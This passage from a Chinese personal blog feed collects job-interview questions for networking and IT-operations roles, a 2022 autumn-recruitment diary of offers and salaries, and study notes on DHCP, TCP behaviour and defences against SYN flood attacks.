class=\"markdownIt-Anchor\" href=\"#13宏杉-技术支持-二面\">#</a> 13. 宏杉 - 技术支持 - 二面</h2>\n<blockquote>\n<p>DRBDR</p>\n<p>LVM 磁盘满了，用另一块磁盘扩容的命令</p>\n<p>工作地点</p>\n<p>你的你的同事做一个项目，因为同事的原因失败了，领导批评了你，你怎么办</p>\n<p>领导给你一个你不会做的比较难的任务，你怎么办</p>\n<p>生涯规划，啥时候来实习</p>\n</blockquote>\n<h2 id=\"14中科闻歌-运维工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#14中科闻歌-运维工程师-一面\">#</a> 14. 中科闻歌 - 运维工程师 - 一面</h2>\n<blockquote>\n<p>OSI 模型</p>\n<p>STP 选举</p>\n<p>防火墙用过吗，啥型号的，A 访问 B 时在防火墙配置单向还是双向，如果是交换机，需要配置单向还是双向</p>\n<p>BGP 选路</p>\n<p>OSPF 邻居建立</p>\n<p>项目</p>\n</blockquote>\n<h2 id=\"15吉利英伦-网络管理专员-一面\"><a class=\"markdownIt-Anchor\" href=\"#15吉利英伦-网络管理专员-一面\">#</a> 15. 吉利英伦 - 网络管理专员 - 一面</h2>\n<blockquote>\n<p>200-300 人的小型网怎么做<br>\n 200-300 人的小型网怎么做<br>\n我说三层，他说只有接入和核心</p>\n<p>链路选择，光还是电，都用在什么场景，传输距离</p>\n<p>有哪些 vpn<br>\n 他说现在都是硬件的，ipsec</p>\n<p>lvm 是啥</p>\n<p>iaas paas saas</p>\n<p>链路可靠性 (聚合</p>\n<p>堆叠，假如五台做堆叠，有一台有上联，怎么搞，堆叠需要啥<br>\n需要堆叠线缆</p>\n<p>怎么控制访问，比如不让访问 qq</p>\n<p>有哪些 cs 的服务，我说 web，他追问中间件有哪些， nginx 干啥的，有啥功能，咋做负载分担<br>\n我说服务器集群，他说还得有数据库集群和其他集群</p>\n<p>怎么样通过域名访问服务器<br>\n我说内网搭个 dns，他说这样只有内网，我又说买个域名设置 ip 解析，他没说啥</p>\n<p>防火墙在出口，怎么保证可靠，还有上网行为管理可靠</p>\n<p>网关在核心，vlan 怎么划分</p>\n<p>上网行为管理放哪，哪种模式</p>\n</blockquote>\n<h2 id=\"16迪普-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#16迪普-技术支持-一面\">#</a> 16. 迪普 - 技术支持 - 一面</h2>\n<blockquote>\n<p>IPSEC 了解过吗</p>\n<p>三层转发源目 IP 源目 MAC 变吗</p>\n<p>BGP 邻居建立</p>\n<p>BGP 传递路由，撤销路由</p>\n<p>bgp refresh import export</p>\n<p>ospf 卡在 exstart 状态原因</p>\n<p>ospf 影响邻居建立因素</p>\n<p>p2mp 和 p2p 能建邻居吗</p>\n<p>linux 压缩解压缩</p>\n<p>tar 命令每个参数含义</p>\n<p>tar 能解压 xxx 吗</p>\n<p>scp 了解过吗</p>\n<p>防火墙转发机制</p>\n<p>防火墙有哪些安全域，dmz 优先级多少</p>\n<p>防火墙区域内互访通吗，区域间呢</p>\n<p>防火墙对于多通道协议支持</p>\n<p>防火墙多通道协议对于 nat 支持</p>\n<p>sql 注入原因与防御</p>\n<p>上网行为管理不通怎么排查 查日志</p>\n<p>割接失败怎么办</p>\n<p>你怎么割接的</p>\n<p>你的优势是什么</p>\n</blockquote>\n<h2 id=\"17腾讯云智-技术运营-一面\"><a class=\"markdownIt-Anchor\" href=\"#17腾讯云智-技术运营-一面\">#</a> 17. 腾讯云智 - 技术运营 - 一面</h2>\n<blockquote>\n<p>两台设备中间经过防火墙，ping 丢包，排错思路</p>\n<p>ospf 常见 lsa</p>\n<p>python 列表去重</p>\n<p>bgp 防环</p>\n<p>云计算了解，云网络了解</p>\n<p>项目具体说说</p>\n<p>linux 你都干啥</p>\n<p>python 你常用哪些库</p>\n<p>python 控制网络设备</p>\n<p>举例深入讲讲看路由交换和防火墙</p>\n<p>aws 定制交换机服务器和商用有啥区别</p>\n<p>aws 部署和退役详细说说</p>\n<p>vps 理解</p>\n</blockquote>\n<h2 id=\"18品高-运维工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#18品高-运维工程师-一面\">#</a> 18. 品高 - 运维工程师 - 一面</h2>\n<blockquote>\n<p>linux 查看内核版本</p>\n<p>查看 cpu 内存磁盘</p>\n<p>mac 和 ip 关系</p>\n<p>路由器转发原理</p>\n<p>linxu 可以做路由器吗</p>\n<p>三层交换机和二层交换机区别</p>\n<p>正向代理反向代理</p>\n<p>实习</p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/",
            "url": "http://example.com/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/",
            "title": "秋招总结",
            "date_published": "2022-10-27T05:38:45.000Z",
            "content_html": "<h1 id=\"秋招总结\"><a class=\"markdownIt-Anchor\" href=\"#秋招总结\">#</a> 秋招总结</h1>\n<h2 id=\"0x00-废话~\"><a class=\"markdownIt-Anchor\" href=\"#0x00-废话~\">#</a> 0x00 废话～</h2>\n<p>秋招从七月份投的第一家特斯拉开始，到目前 (2022.10.15)，已经投了快 170 家了，有安全，网络，运维岗，我只能投这三个岗，因为我也只会这三个。我常因为自己太菜与你们格格不入～。目前 offer 有四家。</p>\n<blockquote>\n<p>我先叠个 buff，下面说的除了技术纯熟虚构，不要对号入座，要是真想展开聊聊可以到主页上找有一篇文章有我的 qq</p>\n<p>1. 信锐 (技术支持)</p>\n<p>通过三面拿到的 offer，一面基本技术面，二面半技术半问答 (文章接下来的问答指的均是聊天，比如有女朋友吗，对技服了解吗这类非技术相关的问题)，三面纯问答聊天。最终想薪资也是目前到现在最高的，年薪可以达到 20</p>\n<p>2. 兴唐通信 (系统集成)</p>\n<p>这是一家国企，带有一些保密性质，因此入职三年之内不能离职，这可能是我最不能接受的点，因为子曾经曰过:“安全人，安全魂，安全人都是人上人”，我的计划是今年经济形势不好先随便找个给的多的企业苟着，来年再战，混到安全去！因此我拒绝了这家的 offer。第二个原因就是给的是在有点少，虽然 base 在上海，我立即推当场回家，但上海不到 xxW (具体多少也不能透露，反正没有 xxW，大概 xxk<sub>)，着实有些难受，而且他的风评也有些诡异，告辞，惹不起</sub>。补充一句，这家也有三面，好像三面都没怎么问技术</p>\n<p>3. 中海达 (技术支持)</p>\n<p>这是一家鸽王<sub>，第一批面试的时候鸽了我 20 分钟，当时还在实习，是在是等不起，于是到了第二批。第二批又鸽了我二十分钟，上午的面试，中午才给我打电话，说改到下午五点，五点又迟到 8 分钟</sub>大无语事件。但那天一面面完第二天还是第三天直接发 offer 了。offer 上面没写薪资没写待遇福利，实在难以下咽，遂告辞。更新 1.0:offer 是九月底发的，但十月中旬突然又来和我探讨薪资的事，您这个跨度有些大啊～，而且给的和兴唐差不多，难顶 (薪资水平 xk-xk 左右)</p>\n<p>4. 保融科技 (技术支持)</p>\n<p>这家公司只有二面，两次面试都没咋问技术，但聊得很开心，是秋招目前为止聊得最开心的公司，一面的小姐姐也很好看<sub>好评</sub>，但无奈薪资问题和预期差距过大，毕竟第一个信锐 offer 拿到后，后面面的给的都没信锐多，厂商规模也没信锐大，这家 base 在杭州，但我的 offer 是实施，就是全国出差的那种，那其实和信锐没啥区别了，两家做的东西都相同的情况下，肯定是找大厂和工资高的，保融啊<sub>我对不起你啊</sub> (2,3,4 这三家其实薪资都差不多)(记一下吧反正不发出去，这个基本薪资 x500，也有烂七八糟的补贴)<br>\n 10.20 补充</p>\n<p>今天又拿了两家 offer，再来废话两句</p>\n<p>5. 宏杉科技 (技术支持)</p>\n<p>这是个存储的公司，在全国大部分城市都有办事处，工作地点也和信锐一样，结合自己的意愿和公司实际情况分配。这家是目前为止除了信锐给的第一多的，一个月基本工资能有 xxk，还有乱七八糟的房补，和其他补贴。但他不讲武德的地方在于，如果你把它违约了你需要支付违约金，但如果你因为他把别人违约了他是一分不给。(学学信锐，哪有这么白嫖的)，而且常住地，户籍所在地是没有房补的。没有必要，拒了。面试一共两次，第一次问了点技术，第二次也问了点，但比第一次少很多，第二次多了很多职场题目。</p>\n<p>6. 东方日升 (运维工程师)</p>\n<p>这家应该是做经济的，我投的好像是啥技术类管培生，他的 offer 上是这么写的，我也不记得我投了啥了。这家一共只有一面，是 hr 和一个问技术的一起面的，但技术没问啥，全问的项目实习，这种回答了几千遍的题目是在没意思，我全程输出，他根本插不上嘴，我一堆 span-leaf，border-leaf 把它杀穿。然后第二天就给 offer 了，问题在于实习 x000，转正 x800。难顶啊～拒了拒了</p>\n<p>10.21 补充，又拿了一家 offer 再来 bb 两句 ，说实话，每次拿到 offer 都把我搞的精疲力尽</p>\n<p>7. 中科闻歌 (运维工程师)</p>\n<p>这家是面到现在最心动的一家公司，面试只有一面，但三个面试官，第一个问网络，第二个问项目，第三个 hr 随便问点，但他们给人一种很重视应届毕业生的感觉，也可能是错觉，而且这家公司规模其实能比信锐更大一些，我投的是做运维的，据他们说他们公司会让网络和搞云计算的一起工作，达成一些目的。但无奈薪资实在尴尬，北京 xw，没有房补，我真的要露宿街头了，当场贷款上班，告辞，最不巧的是给信锐寄方法和给中科翁工决定是同一天的同一个下午，但凡他有个房补，我当场违约。</p>\n<p>10.25 补充，这是昨天还是前天的 offer 了</p>\n<p>8. 石化盈科 (网络安全工程师)</p>\n<p>非常奇葩的面试，只有一面，但一面包车的面试官，一个腾讯会议进去十几个人，每个人都应该是部门的经理一类的，然后 hr 是先和你进行讨论的人，讲到哪个技术部门负责人感兴趣会对你进行追问，比如当时有个部门应该是搞渗透测试的，还有个应该是搞二进制的。这个 offer 也很奇葩，hr 告诉部门经理 offer 已经给我了，让他来找我沟通，结果我没有收到 offer，听这个人一顿讲，最后不知道薪资多少。最后还是他帮我问的，一个月 xk+，还是包含房补的，工作地点在北六环附近，那边租房也得 2k-3k，抢钱啊～，但听那人最后的意思是找我去做数据中心运维…</p>\n<p>10.29 补充</p>\n<p>9. 上海汉得信息 (云解决方案工程师)</p>\n<p>这个虽然名字很高级，什么云方案，但其实就是运维 + 技术支持，在上海总部，这是他比信锐唯一好的一点，薪资的话 ([xk-xk]+ 房补)，有培训期，2-3weeks，有实习期，你拿到毕业证之前都算实习期，还有试用期，6 months，最后才是转正，每一级都会比上一级至少少 80%，就是转正之后每天还要为 2k 奋斗，因为如果只拿 xk 容易饭都吃不起，40|80 是项目补贴，每天都有，试用 x，转正 x,x 好像是餐补，房补不会真给你，但他会在公司附近帮你租房，或者住员工宿舍，其实算下来在北京租完房剩的和这差不多了，但我还想等等大厂，毕竟这家。。不是特别有想法。</p>\n<p>11.2 更新</p>\n<p>10. 中科曙光（云平台网络研发工程师）</p>\n<p>这家特别离谱，让我做了三遍测评，说是前两遍没过，hr 甚至还找不部门的人为了给我第三次机会，然鹅，我做完了第三次，他们就不鸟我了，我记得 10.31 看到了中科曙光毁约在牛客上，我 emmmm，结果他们今天又来找我了，还来沟通 offer，xw 年薪，每个月还有 400 餐补，一天 10 块钱，我喝西北风去吧还有七险两金，说自己是国企性质，呵呵呵，谁都说自己国企性质，国企性质和国企是两码事，别被骗了，我拖了两天，给他和我都留个台阶下，不如意外肯定拒了，他 base 在成都，其实成都这个价还行，但我纠结汉得和信锐，可恶啊，Amazon 不理我，云智也不理我，难顶～</p>\n</blockquote>\n<p>再废话两句，1. 有能投的就投，千万别看大小，举个栗子，谁都没想到今年最高的是个没听过名字的机器人公司，你认为的小厂不一定是小厂，一般有机构看机构的就业群，没有找公众号，公众号的企业虽然多，但不是所有企业都要我这种 IT 的，秋招群里的信息实际上是老师们过滤之后的，有针对性了很多</p>\n<p>2. 笔试和测评可能很多很多，但还是要好好做的，万一呢～</p>\n<p>3. 考研，考研，考研，重要的事情说八百遍，今天面试的哥们问我你有 ie 为啥不去华为，我:…，华为是不会要双非的本科的，考研最好也往 211 考。</p>\n<p>4. 最好对自己投的企业做个详细记录，同时对面试过程也做个详细记录，方便后续复盘，我今天的复盘的全部内容来自于我每次面完写的 CSDN，最好每次面完就复盘，这样对你下一家类似岗位的很有帮助，人不能在一个地方疯狂翻车</p>\n<p>5. 不要死磕运维 / 安全岗，有给的多的，差不多能干的就先跑，不雅等春招，某个企业的 HR 在和我聊得时候透露等春招他们就剩个位数岗位或者直接不招了，而且春招还要再加几百万研究生们，难度直接上天</p>\n<p>总结到这，废话说完了，开始正题，预计文章会有两大部分。 <code>1.网络岗，技术支持岗，运维岗面试总结</code>     <code>2.安全岗面试总结</code></p>\n<p>项目实习啥的就不说了问的基本上都一样，还有一些你遇到的困难，印象深刻的事啦，随缘临场发挥吧</p>\n<p>安全岗包括但不限于安服，网络安全管培生等职位，和安全相关的都在下面列举</p>\n<h2 id=\"0x01-网络技术支持运维岗总结\"><a class=\"markdownIt-Anchor\" href=\"#0x01-网络技术支持运维岗总结\">#</a> 0x01 网络，技术支持，运维岗总结</h2>\n<h3 id=\"1dhcp工作原理报文种类\"><a class=\"markdownIt-Anchor\" href=\"#1dhcp工作原理报文种类\">#</a> 1.DHCP 工作原理，报文种类</h3>\n<p><code>出现厂家：特斯拉一面(ip helper address)，信锐(获取地址方法，问的其实还是这个)，中科曙光，宏杉</code></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016184839806.png\" alt=\"image-20221016184839806\" style=\"zoom: 67%;\" />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.四次交互获取IP</span><br><span class=\"line\">广播发送discover报文，寻找DHCP服务器</span><br><span class=\"line\">offer单播回，其中包含着一个ip地址和一些配置信息比如，网关，租期，dns等</span><br><span class=\"line\">广播发送request请求这个IP地址，发广播的原因可能网络中还有其他的DHCP服务器，告诉他们自己有了IP地址</span><br><span class=\"line\">dhcp服务器收到a的request之后单播发送一个ACK,此地址才可以开始使用</span><br><span class=\"line\"></span><br><span class=\"line\">2.租期，续约</span><br><span class=\"line\">当租期到达50%会单播发送request包，服务器收到单播回复ack，主机租期刷新</span><br><span class=\"line\">在租期到达85%会广播发送request包，网络上任何一台DHCP服务器都可以应答ack或者nak，收到ACK刷新租期，收到NAK重新申请IP</span><br><span class=\"line\">当租期到达100%会发送release报文，释放IP地址，之后重新discover申请地址</span><br><span class=\"line\">即可以通过request刷新租期，release释放地址</span><br><span class=\"line\"></span><br><span class=\"line\">3.DHCP是UDP的，使用67(server),68(client)</span><br><span class=\"line\"></span><br><span class=\"line\">4.dhcp一共八种报文，剩下四种</span><br><span class=\"line\">NAK：服务器拒绝请求</span><br><span class=\"line\">release：释放IP地址</span><br><span class=\"line\">infrom：向服务端请求一些信息</span><br><span class=\"line\">decline：地址冲突时，告知服务器禁止使用此地址</span><br><span class=\"line\"></span><br><span class=\"line\">5.一些协议细节~</span><br><span class=\"line\">1.如果该客户端上次也问服务端要过地址，那么客户端在检查该地址没有被分配有还是会分配给这个客户端(所以说dhcp是C/S的)</span><br><span class=\"line\">2.客户端发的discover含有request ip，服务端检查地址是否可用，如果可用，还是会分给客户端此地址</span><br><span class=\"line\">3.客户端发的discover不含request ip，服务端从地址池上找一个最小的可用IP分配</span><br><span class=\"line\">4.NAK的情况：请求的静态IP，MAC无法与之对应。ack中验证失败</span><br><span class=\"line\"></span><br><span class=\"line\">6.DHCP offer中有租期是华为特有,其他厂商是使用inform报文</span><br><span class=\"line\">最好看看不同厂商对于DHCP的支持</span><br></pre></td></tr></table></figure>\n<h4 id=\"dhcp中继云智\"><a class=\"markdownIt-Anchor\" href=\"#dhcp中继云智\">#</a> dhcp 中继 (云智)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DHCP中继，其实就是在与DHCP Server不同而又需要申请DHCP服务的网络内，设置一个中继器，中继器在该网络中代替DHCP Server服务器接收DHCP Client的请求，并将DHCP Client发给DHCP Server的DCHP报文，以单播的形式发送给DHCP Server。DHCP Server在收到由DHCP发送来的DHCP 报文后，同样会把响应的DHCP报文发送给DHCP 中继。这样，DHCP其实是充当了一个中间人的作用，起到了在不同的网络中运行DHCP的目的。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"3tcpudp相关\"><a class=\"markdownIt-Anchor\" href=\"#3tcpudp相关\">#</a> 3.TCP/UDP 相关</h3>\n<h4 id=\"tcp滑动窗口初始值慢启动流控快手\"><a class=\"markdownIt-Anchor\" href=\"#tcp滑动窗口初始值慢启动流控快手\">#</a> tcp 滑动窗口初始值，慢启动，流控 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">滑动窗口</span><br><span class=\"line\">TCP连接每一方的接收缓冲空间大小都固定，接收端只允许另一端发送接收端缓冲区所能接纳的数据，TCP在滑动窗口的基础上提供流量控制，防止较快主机致使较慢主机的缓冲区溢出；TCP也是一样的，除了入口有发送方滑动窗口，出口处也设立有接收方滑动窗口。</span><br><span class=\"line\">拥塞控制</span><br><span class=\"line\">防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。</span><br><span class=\"line\">拥塞控制避免</span><br><span class=\"line\">慢开始( slow-start )、拥塞避免( congestion avoidance )、快重传( fast retransmit )和快恢复( fast recovery )。</span><br><span class=\"line\">发送方维持一个拥塞窗口 cwnd ( congestion window )的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送方让自己的发送窗口等于拥塞。</span><br><span class=\"line\">发送方控制拥塞窗口的原则是：只要网络没有出现拥塞，拥塞窗口就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入到网络中的分组数。</span><br><span class=\"line\">慢开始算法：当主机开始发送数据时，如果立即所大量数据字节注入到网络，那么就有可能引起网络拥塞，因为现在并不清楚网络的负荷情况。因此，较好的方法是 先探测一下，即由小到大逐渐增大发送窗口，也就是说，由小到大逐渐增大拥塞窗口数值。通常在刚刚开始发送报文段时，先把拥塞窗口 cwnd 设置为一个最大报文段MSS的数值。而在每收到一个对新的报文段的确认后，把拥塞窗口增加至多一个MSS的数值。用这样的方法逐步增大发送方的拥塞窗口 cwnd ，可以使分组注入到网络的速率更加合理。</span><br><span class=\"line\">...自己看吧，我也不知道这啥玩意</span><br><span class=\"line\">https://blog.csdn.net/qq_41431406/article/details/97926927</span><br><span class=\"line\">https://blog.csdn.net/ligupeng7929/article/details/79597423</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp-syn-flood-防御快手\"><a class=\"markdownIt-Anchor\" href=\"#tcp-syn-flood-防御快手\">#</a> TCP syn flood 防御 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用TCP三次握手协议，大量与服务器建立半连接，服务器默认需要重试5次，耗时63s才会断开接，这样，攻击者就可以把服务器的syn连接队列耗尽，让正常的连接请求不能处理。</span><br><span class=\"line\">最直接的做法就是提高服务能力，比如组建集群，升级硬件。</span><br><span class=\"line\">对于防火墙这类安全设备而言，SYN报文是正常的业务报文，防火墙的安全策略必须允许其通过，否则服务器就无法对外提供服务。</span><br><span class=\"line\">如果能明确虚假源的IP地址，就能通过精细的安全策略阻止这些源发来的SYN报文。</span><br><span class=\"line\">此时需要anti-DDoS。Anti-DDoS系统处理SYN报文主要有两种手段，源认证和首包丢弃。</span><br><span class=\"line\">Anti-DDoS系统拦截客户端发送的SYN报文，代替服务器向客户端发送SYN-ACK报文，如果客户端不应答，则认为该客户端为虚假源；如果客户端应答，则Anti-DDoS系统认为该客户端为真实源，并将其IP地址加入白名单，在一段时间允许该源发送的所有SYN报文通过，也不做代答。</span><br><span class=\"line\">如果Anti-DDoS系统代替服务器应答了所有的SYN Flood攻击报文，那么性能瓶颈仅仅是从服务器转移到了Anti-DDoS系统而已。一旦Anti-DDoS系统的系统资源耗尽，攻击依旧会透传到服务器，而且大量反弹的SYN-ACK报文也会对网络造成一定的压力。Anti-DDoS系统利用首包丢弃来解决这个问题。</span><br><span class=\"line\">TCP协议的可靠性不仅体现在三次握手，还体现在超时与重传的机制。正常情况下客户端发送SYN报文后如果在一定时间没有收到服务器的SYN-ACK应答，客户端会重新发送SYN报文。Anti-DDoS系统会丢弃掉收到的第一个SYN报文。SYN Flood攻击时，黑客发送的绝大多数是变源的SYN报文，所有的SYN报文对于Anti-DDoS系统来说都是首包，都将被直接丢弃。如果客户端重传了SYN报文，Anti-DDoS系统再对该报文进行源认证。如此一来，大大减少了Anti-DDoS系统代答的压力。首包丢弃和源认证两种手段结合，对于防御SYN Flood（特别是不断变换源IP和源端口的虚假源攻击）非常有效。</span><br><span class=\"line\">hping3</span><br><span class=\"line\">hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。</span><br><span class=\"line\">增大tcp_max_syn_backlog   增大队列用来存放还没有确认ACK的客户端请求</span><br><span class=\"line\">减小tcp_synack_retries    减少服务端重发ack的次数</span><br><span class=\"line\">启用tcp_syncookies\t\t当启用tcp_syncookies时，backlog满了后，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列backlog里（即没有存储任何关于这个连接的信息，不浪费内存）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。</span><br><span class=\"line\"></span><br><span class=\"line\">过滤</span><br><span class=\"line\">增加积压</span><br><span class=\"line\">减少SYN-RECEIVED定时</span><br><span class=\"line\">复用古老的半开通TCP</span><br><span class=\"line\">SYN缓存</span><br><span class=\"line\">SYN Cookie</span><br><span class=\"line\">混合方法</span><br><span class=\"line\">防火墙和代理</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp和udp区别茄子汉得\"><a class=\"markdownIt-Anchor\" href=\"#tcp和udp区别茄子汉得\">#</a> tcp 和 UDP 区别 (茄子，汉得)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议</span><br><span class=\"line\">UDP（User Data Protocol）是一个非连接的协议，传输数据之前源端和终端不建立连接</span><br><span class=\"line\"></span><br><span class=\"line\">2.UDP和TCP报头长度</span><br><span class=\"line\">UDP 8字节</span><br><span class=\"line\">TCP 20字节</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br><span class=\"line\">UDP面向报文，尽力而为，没有拥塞控制等算法</span><br><span class=\"line\">TCP可靠，有差错校验，滑动窗口，流控，面向字节流</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br><span class=\"line\">TCP只能点到点全双工，UDP支持一对一，一对多，多对一</span><br><span class=\"line\"></span><br><span class=\"line\">5.</span><br><span class=\"line\">TCP要求的系统资源较多，UDP较少</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp四次挥手timewait作用长亭\"><a class=\"markdownIt-Anchor\" href=\"#tcp四次挥手timewait作用长亭\">#</a> tcp 四次挥手 timewait 作用 (长亭)</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/7bc94edb74608af80fbb4de8ab9c1bd7.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/11bd3c08694c9f869c3607fe32edb8ff.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">timewait的作用：</span><br><span class=\"line\">为了确保最后的 ACK 能让被动关闭方接收，从而帮助其正常关闭。</span><br><span class=\"line\">在这里，如果图中主机 1 的 ACK 报文没有传输成功，那么主机 2 就会重新发送 FIN 报文。如果主机 1 没有维护 TIME_WAIT 状态，而直接进入 CLOSED 状态，它就失去了当前状态的上下文，只能回复一个 RST 操作，从而导致被动关闭方出现错误。而重发fin一来一去正好两个MSL</span><br><span class=\"line\">让之前因为某些原因延迟到达路由器的报文消失，如果关闭的连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起</span><br><span class=\"line\">time-wait是从主机A收到FIN后发送ack开始计时的</span><br><span class=\"line\"></span><br><span class=\"line\">timewait的危害</span><br><span class=\"line\">第一是内存资源占用</span><br><span class=\"line\">第二是对端口资源的占用，一个 TCP 连接至少消耗一个本地端口。</span><br></pre></td></tr></table></figure>\n<h4 id=\"为啥挥四次握三次长亭\"><a class=\"markdownIt-Anchor\" href=\"#为啥挥四次握三次长亭\">#</a> 为啥挥四次握三次 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">为了保证A发送的最有一个ACK报文段能够到达B。</span><br><span class=\"line\">没有数据传输，服务端的SYN和ACK报文可以一起发送，但是挥手时有数据传输,等待自己的数据传输完成后再ACK，ACK和FIN报文不能同时发送</span><br></pre></td></tr></table></figure>\n<h4 id=\"接下来是八股文时间~\"><a class=\"markdownIt-Anchor\" href=\"#接下来是八股文时间~\">#</a> 接下来是八股文时间：~</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00 TCP第一次握手SYN包丢包</span><br><span class=\"line\">重传第一个包，重传次数由/proc/sys/net/ipv4/tcp_syn_retries决定，每次重传的时间翻倍上涨的，直至达到tcp_syn_retries决定，不在重传，开始摆烂</span><br><span class=\"line\">1 2 4 8 16 32 酱紫翻倍的</span><br><span class=\"line\"></span><br><span class=\"line\">0x01 TCP第二次握手SYN包丢包</span><br><span class=\"line\">客户端无法收到synack包，会重传syn。</span><br><span 